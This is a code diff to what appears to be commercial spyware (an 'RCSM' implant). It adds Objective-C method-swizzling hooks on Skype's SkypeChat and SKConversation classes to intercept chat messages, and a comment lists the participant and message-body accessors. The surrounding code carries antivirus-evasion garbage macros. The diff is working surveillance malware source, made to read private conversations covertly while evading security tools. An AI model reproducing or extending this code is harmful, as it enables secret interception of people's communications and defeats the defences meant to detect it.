@@ -36,6 +36,8 @@
 #import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"
 #import "RCSMAVGarbage.h"
 
+extern NSString *class_dump_class(Class class);
+
 #define swizzleMethod(c1, m1, c2, m2) do { \
           method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                          class_getInstanceMethod(c2, m2)); \
@@ -1387,8 +1389,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
     
     // AV evasion: only on release build
-    AV_GARBAGE_005 
-
+    AV_GARBAGE_005
+    
     if (imFlag == 1)
     {   
       // AV evasion: only on release build
@@ -1450,7 +1452,9 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       {   
         // AV evasion: only on release build
         AV_GARBAGE_007 
-
+#ifdef DEBUG_INPUT_MANAGER
+        infoLog(@"Hooking SkypeChat class");
+#endif
         // Skype
         // In order to avoid a linker error for a missing implementation
         Class className   = objc_getClass("SkypeChat");
@@ -1460,12 +1464,52 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
         Class classSource = objc_getClass(kMySkypeChat);
         
-        // AV evasion: only on release build
+        // AV evasion: only on release bu ild
         AV_GARBAGE_003 
 
+        BOOL skypeRet =
         swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                             class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                             @selector(isMessageRecentlyDisplayedHook:));
+        
+        /* HOOK: [SKConversation onMessage:(NSNumber) mesgID]
+         po [SKConversation participants]
+         <__NSArrayM 0xa31f430>(
+         SKMyselfParticipant 0xd9cdb70 max-chiodo conversation=0xa31d2f0,
+         SKParticipant 0xd9cfd60 alberto.ornaghi conversation=0xa31d2f0
+         )
+         [SKConversation messages] lastObject]
+         
+         [0xd990580 bodyTextSansXML]
+         [0xd990580 author]
+         */
+        // check if skype is 6.1
+        if (skypeRet == FALSE)
+        {
+          className   = objc_getClass("SKConversation");
+          
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Hooking SKConversation class");
+#endif
+          if (className != nil)
+          {
+            swizzleByAddingIMP (className, @selector(onMessage:),
+                                class_getMethodImplementation(classSource, @selector(onMessageHook:)),
+                                @selector(onMessageHook:));
+          }
+          else
+          {
+#ifdef DEBUG_INPUT_MANAGER
+            infoLog(@"Hooking SKConversation class failed!");
+#endif
+          }
+        }
+        else
+        {
+#ifdef DEBUG_INPUT_MANAGER
+          infoLog(@"Hooking SkypeChat class done!");
+#endif
+        }
         
         // AV evasion: only on release build
         AV_GARBAGE_008
@@ -1531,9 +1575,20 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_000 
 
+      BOOL skypeRet =
       swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                           class_getMethodImplementation(className, @selector(isMessageRecentlyDisplayedHook:)),
                           @selector(isMessageRecentlyDisplayedHook:));
+      
+      if (skypeRet == FALSE)
+      {
+        className   = objc_getClass("SKConversation");
+        
+        if (className != nil)
+          swizzleByAddingIMP (className, @selector(onMessage:),
+                              class_getMethodImplementation(className, @selector(onMessageHook:)),
+                              @selector(onMessageHook:));
+      }
     }
     
     if (clipboardFlag == 1)
